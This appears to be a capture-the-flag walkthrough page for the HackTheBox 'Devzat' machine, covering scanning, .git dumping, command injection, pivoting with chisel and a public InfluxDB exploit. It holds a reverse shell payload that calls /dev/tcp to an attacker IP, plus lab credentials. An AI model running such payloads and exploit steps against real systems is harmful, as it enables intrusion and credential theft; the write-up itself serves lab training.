<!--
Author: W3layouts
Author URL: http://w3layouts.com
-->
<!doctype html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <title>LUCIFER</title>

  <!-- google fonts -->
  <link href="//fonts.googleapis.com/css?family=Nunito:400,700&display=swap" rel="stylesheet">

  <!-- Template CSS -->
  <link rel="stylesheet" href="assets/css/style-starter.css">

</head>

<body>
<!-- header -->
<header>
  <div class="w3l-header" id="home">
    <div class="container">
      <nav class="navbar navbar-expand-lg navbar-dark pl-0 pr-0">
        <a class="navbar-brand m-0" href="index.html"><span>☠︎︎</span></span> LUCIFER </a>
        <!-- if logo is image enable this   
            <a class="navbar-brand" href="#index.html">
                <img src="image-path" alt="Your logo" title="Your logo" style="height:35px;" />
            </a> -->
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false"
          aria-label="Toggle navigation">
          <span class="navbar-toggler-icon fa fa-bars"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav ml-auto">
            <li class="nav-item mr-lg-4">
              <a class="nav-link pl-0 pr-0" href="index.html">Home <span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item mr-lg-4">
              <a class="nav-link pl-0 pr-0" href="services.html">Contents</a>
            </li>
            <li class="nav-item mr-lg-4">
              <a class="nav-link pl-0 pr-0" href="writeups.html">Writeups</a>
            </li>
              <li class="nav-item mr-lg-4">
                <a class="nav-link pl-0 pr-0" href="networking.html">Networking</a>
              </li>
              <li class="nav-item mr-lg-4">
                <a class="nav-link pl-0 pr-0" href="extra.html">Extraz</a>
              </li>
            </li>
            <li class="nav-item">
              <a class="nav-link pl-0 pr-0" href="contact.html">Contact</a>
            </li>
          </ul>
        </div>
      </nav>
    </div>
  </div>
</header>
<!-- //header -->
<!-- about me -->
<div class="w3l-about py-5">
    <div class="container py-lg-3">
        <div class="row about-content mb-lg-5">
            <div class="col-lg-6 pr-md-5">
                <div class="image-block">
                    <img src="assets/images/walkthroughs/Devzat/logo.jpg" class="img-fluid myphoto" alt="my photo" />
                    <img src="assets/images/cross.png" class="img-fluid pos" alt="dots" />
                </div>
            </div>
            <div class="col-lg-6 info pl-lg-5 mt-lg-0 mt-5 pt-lg-0 pt-3 align-center">
                <h2 class="">Devzat — HackTheBox walkthrough</h2>
                <div style="text-align: right 250px;">
                            <div style="text-align: right 250px;">
                <h5 class="">CONTENT :
                  <div style="text-align: right 250px;">
                    1.  Connecting to HTB machine
                    <div style="text-align: right 250px;">
                      2.  Nmap scanning
                      <div style="text-align: right 250px;">
                        3.  Adding to localhost
                        <div style="text-align: right 250px;">
                          4.  Fuff scanning
                          <div style="text-align: right 250px;">
                            5.  Git source code enumeration
                            <div style="text-align: right 250px;">
                              6.  Using Wireshark
                              <div style="text-align: right 250px;">
                                7.  Getting reverse shell
                                <div style="text-align: right 250px;">
                                  8.  Using burpsuite
                                  <div style="text-align: right 250px;">
                                    9.  Pivoting
                                    <div style="text-align: right 250px;">
                                      10. InfluxDB exploitation
                                      <div style="text-align: right 250px;">
                                        11. Switching to Catherine
                                        <div style="text-align: right 250px;">
                                          12. Root flag captured
                                         </h5>
</div>
    </div>
       </div>
        </div>
        <div style="text-align: center;">
            <h6 style="font-weight: bold;">1. CONNECTING TO HTB [via VPN]:</h6>
            <p> First of all, we need to connect to the HTB machine using a VPN that is downloaded from HTB.</p>
            <div style="text-align: left 250px;"></div>
            <code>  My VPN:lab_dracula2001.ovpn
              <div style="text-align: left 250px;"></div>
                  command: Openvpn lab_dracula2001.ovpn [command used to connect the VPN]
            </br>  Machine IP 10.10.11.118 </code>
            <div style="text-align: center;">
              <img src="assets/images/walkthroughs/Devzat/vpn connect.jpg" class="img-fluid signature mt-4 mb-2" width="900px" alt="my photo" />
            </div>
              </div>
              <div style="text-align: center;">
                <h6 style="font-weight: bold;">2. Nmap Scanning [for open ports]:</h6>
                <p>Nmap tool is used to scan the open ports.</p>
                <code>commands: nmap -A 10.10.11.118 [-A is used for aggressive scan]</code>
              </div>
                  <div style="text-align: center;">
                    <img src="assets/images/walkthroughs/Devzat/nmap.jpg" class="img-fluid signature mt-4 mb-2" width="900px" alt="my photo" />
                    <div style="text-align: center;">
                    <p>Nmap scan result: Port 22, Port 80, Port 8000,
                    <br> apache service is running on port 80, </br>
                    so here we get to know that there is a webpage running.</p>
                </div></br>
                <div style="text-align: center;">
                  <h6 style="font-weight: bold;">3. Adding to Localhost:</h6> 
                  <p>But here we need to add this to our localhost otherwise <br>
                     we can't view the website</p>
                  <code>Command: nano /etc/hosts [used to add hosts]</code>
                  <img src="assets/images/walkthroughs/Devzat/localhost.jpg">     
                  <p>After setting up localhost we will be able to view the website</p></br> 
                  <img src="assets/images/walkthroughs/Devzat/website.jpg">
                  <br>
                  <h6 style="font-weight: bold;">Gobuster Scanning:</h6><br>
                  <p>I tried using the gobuster scan and didn't get the result,<br>
                   so, I just move on to the vhost scanning using the tool ffuf</p>
                   <code>gobuster dir -u http://10.10.11.118:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium<br> 
                    [gobuster dir — u (URL of website) — w (wordlist)]</code>
                    <br></br>
                   <h6 style="font-weight: bold;">Gobuster Scanning result:</h6><br>
                   <img src="assets/images/walkthroughs/Devzat/gobuster fail.jpg">
                   <br></br>
                   <h6 style="font-weight: bold;">4. Fuff Scanning:</h6><br>
                   <code>command: fuff — w /usr/share/seclists/Discovery/DNS/subdomains-topmillion- 5000.txt -mc 200 -c -u https://devzat.htb/ -H “HOST: FUZZ.devzat.htb”</code>
                  <p>After scanning, we get to know that the vhost pet (website) need to add<br>
                    to the localhost file. </p><br>
                    <img src="assets/images/walkthroughs/Devzat/localhost website.jpg">
                    <br></br>
                    <p>Scanning web directory pets.devzat.htb:</p>
                    <code>Command : ffuf -u http: //pets.devzat.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content-raft-small- words.txt -fs 510</code>
                    <br>
                    <h6 style="font-weight: bold;">5. Git source code enumeration:</h6><br>
                    <p>Here we need to go through each directory to find <br>
                       the git file and download it</p>
                       <code>Command : wget -r -np -R “index.html*” http://pets.devzat.htb/.git and filename is pets.devzat.htb </code>
                       <br>
                       <img src="assets/images/walkthroughs/Devzat/wget.jpg">
                       <br>
                       <p>After downloading, go through the directories and<br> check for the git status using the command git status :</p>
                       <br>
                       <img src="assets/images/walkthroughs/Devzat/gitstatus.jpg">
                       <br>
                       <p>And here we can see that many files has been deleted, so we need to restore them.<br>
                      The command used to restore: <code>git restore. </code></p>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/gitrestore.jpg">
                      <br>
                      <p>Here let's go through the file called main.go</p>
                      <br>
                      <code>Command: cat main.go [command used to view the content inside the file.]</code>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/catmaingo.jpg">
                      <img src="assets/images/walkthroughs/Devzat/catmaingo2.jpg">
                      <p>After going through the file, we got to know that website pets.devzat.htb<br>
                      has command injection vulnerable [Command injection is possible in species]</p>
                      <br>
                      <h6 style="font-weight: bold;">6. Using Wireshark :</h6><br>
                      <p>Wireshark result to show vulnerable by capturing the icmp echos.</p>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/wireshark.jpg">
                      <br>
                      <h6 style="font-weight: bold;">7. Getting reverse shell :</h6><br>
                      <p>For gaining access to reverse shell, we nee to make a payload using the following command.</p>
                      <code>Command: echo -n ‘bash -I>&/dev/tcp/10.10.14.84/9001 0>&1’ | base64 </code>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/geting revesershell.jpg">
                      <br>
                      <h6 style="font-weight: bold;">8. Using Burpsuite :</h6><br>
                      <img src="assets/images/walkthroughs/Devzat/burpsuite.jpg"><br>
                      <p>To intercept the web request, we nee to turn on the <code>"intercept is on"</code> in proxy option,<br> 
                        on the burpsuite application. After that go to the website and turn on proxy.</p>
                        <img src="assets/images/walkthroughs/Devzat/petwebsite(proxy).jpg">
                        <img src="assets//images/walkthroughs/Devzat/proxy1.jpg">
                        <br>
                        <p>Here we got intercepting result and place the payload in species section as shown below:</p>
                        <br>
                        <img src="assets//images/walkthroughs/Devzat/proxy2.jpg"><br>
                        <p>After adding payload start-up the listner</p>
                        <br>
                        <code>Command: nc -lnvp 9001</code>
                        <br>
                        <img src="assets//images/walkthroughs/Devzat/listner.jpg">
                        <br>
                        <p>Now we got the reverse shell access. After getting reverse shell, Check for the system id which shows the results as: </p>
                        <br>
                        <code>Command: id</code>
                        <br>
                        <img src="assets//images/walkthroughs/Devzat/id.jpg">
                        <br>
                        <h6 style="font-weight: bold;">9. Pivoting :</h6><br>
                        <p>Here we use chisel tool to port forward back to the attackers machine. chisel
                          is downloaded and configured from Github to our machine and then it is transferred to 
                          devzat by using pythhon server.
                        </p>
                        <br>
                        <img src="assets/images/walkthroughs/Devzat/pivoting.jpg"><img src="assets/images/walkthroughs/Devzat/chisel.jpg">
                        <br>
                        <h6 style="font-weight: bold;">Chisel on devzat  :</h6>
                        <br>
                        <img src="assets//images/walkthroughs/Devzat/chisel on devtaz machine.jpg">
                        <br>
                        <p>After port forwarding, lets run the nmap scan.</p><br>
                        <code>Command: nmap -p 8086 -sV 127.0.0.1</code><br>
                        <img src="assets//images/walkthroughs/Devzat/nmapscan -p.jpg">
                        <br>
                        <h6 style="font-weight: bold;">10. InfluxDB exploitation  :</h6>
                        <br>
                        <p>Afetr doing nmap scan we get to know that influxDB service is running on port 
                          8086, so now we have to search for it exploits<br>
                          <code>URL of github (exploit) : https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE- 2019–20933<br>
                            Command : git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE- 2019–20933</code><br>
                            Download it and give permission.<br>
                          <code>Command: chmod +x__main__.py<br>
                           pip install -r requirements.txt</code>
                        </p>
                        <img src="assets/images/walkthroughs/Devzat/chmod.jpg">
                        <br>
                        <p>After doing these steps start the influxDB exploit.</p>
                        <br>
                        <code>Command: python3__main__.py</code>
                        <br>
                        <img src="assets/images/walkthroughs/Devzat/influxDBexploit.jpg">
                        <br>
                        <p>List the table using.</p><br>
                        <code>Command: SHOW MEASUREMENTS</code>
                       <br>
                       <img src="assets/images/walkthroughs/Devzat/Show measurements.jpg">
                       <br>
                       <code>select *from “user”</code><br>
                       <img src="assets/images/walkthroughs/Devzat/Select from user.jpg">
                       <br>
                       <p>User: catherine<br>
                        Password: woBeeYareedahc7Oogeephies7Aiseci <br>
                      Now we got the password of Catherine user, so we can login as catherine user.</p>
                      <br>
                      <h6 style="font-weight: bold;">11. Switching to Catherine user  :</h6>
                      <code>Command: su catherine<br>
                      cat user.txt [to view the user flag]</code><br>
                      <img src="assets/images/walkthroughs/Devzat/Su catherine.jpg">
                      <br>
                      <p>User flag:</p>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/Userflag.jpg">
                      <br>
                      <p>Here we got a zip files named devzat-dev.zip and devzat-main.zip so we need to unzip it into /tmp directory. </p><br>
                      <code>Command : cp devzat-dev.zip /tmp</code>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/Cp.jpg">
                      <br>
                      <p>From the diff command, the “dev” environment implements the file reading function using the file command with password protection. The “dev” environment is running on localhost port 8443, hence from the initial enumeration using 
                        Patrick account unable to check the process running 8443.<br></p>
                      <code>Command: diff dev/commands.go main/commands.go</code>
                      <img src="assets/images/walkthroughs/Devzat/diff.jpg">
                      <br>
                      <p>Now, we need to download chisel in Catherine user for port forwarding.</p>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/Catherine port forwarding.jpg">
                      <br>
                      <p>After downloading we need to give permission to chisel file.</p>
                      <br>
                      <code>Command:chmod +x chisel_1.7.3_linux_amd64</code>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/chmod chisel.jpg">
                      <br>
                      <p>Now we need to do port forwarding from here to our own machine by using the tool we previously used (chisel) and ssh port will be  <b>8443</b>.</p>
                      <br>
                      <code>Command : ssh -l test 127.0.0.1 -p 8443</code>
                      <br>
                      <img src="assets/images/walkthroughs/Devzat/ssh.jpg">
                      <br>
                      <h6 style="font-weight: bold;">12. Root Flag Capturing  :</h6>
                      <br>
                      <code>Command : /file ../root.txt CeilingCatStillAThingin2021?</code>
                      <p>Finally, the system is PWNED !!</p>






                      





















</section>
     </div>
          </div>
        </div>
      </div>
    </div>
  </section>
</footer>
<!-- //Footer -->

<!-- move top -->
<button onclick="topFunction()" id="movetop" class="editContent" title="Go to top">
  <span class="fa fa-angle-up"></span>
</button>
<script>
  // When the user scrolls down 20px from the top of the document, show the button
  window.onscroll = function () {
    scrollFunction()
  };

  function scrollFunction() {
    if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
      document.getElementById("movetop").style.display = "block";
    } else {
      document.getElementById("movetop").style.display = "none";
    }
  }

  // When the user clicks on the button, scroll to the top of the document
  function topFunction() {
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
  }
</script>
<!-- /move top -->

<!-- common jquery -->
<script src="assets/js/jquery-3.3.1.min.js"></script>
<!-- //common jquery -->

<!-- disable body scroll which navbar is in active -->
<script>
  $(function () {
    $('.navbar-toggler').click(function () {
      $('body').toggleClass('noscroll');
    })
  });
</script>
<!-- disable body scroll which navbar is in active -->


<!-- for blog carousel slider -->
<script src="assets/js/owl.carousel.js"></script>
<script>
  $(document).ready(function () {
    var owl = $('.owl-carousel');
    owl.owlCarousel({
      stagePadding: 20,
      margin: 15,
      nav: false,
      loop: false,
      responsive: {
        0: {
          items: 1
        },
        600: {
          items: 2
        },
        1000: {
          items: 3
        }
      }
    })
  })
</script>
<!-- //for blog carousel slider -->


<!-- stats number counter-->
<script src="assets/js/jquery.waypoints.min.js"></script>
<script src="assets/js/jquery.countup.js"></script>
<script>
  $('.counter').countUp();
</script>
<!-- //stats number counter -->

<!-- jQuery-Photo-filter-lightbox-portfolio-plugin -->
<script src="assets/js/jquery-1.7.2.js"></script>
<script src="assets/js/jquery.quicksand.js"></script>
<script src="assets/js/script.js"></script>
<script src="assets/js/jquery.prettyPhoto.js"></script>
<!-- //jQuery-Photo-filter-lightbox-portfolio-plugin -->

<!--  bootstrap js -->
<script src="assets/js/bootstrap.min.js"></script>
<!--  //bootstrap js -->

</body>

</html>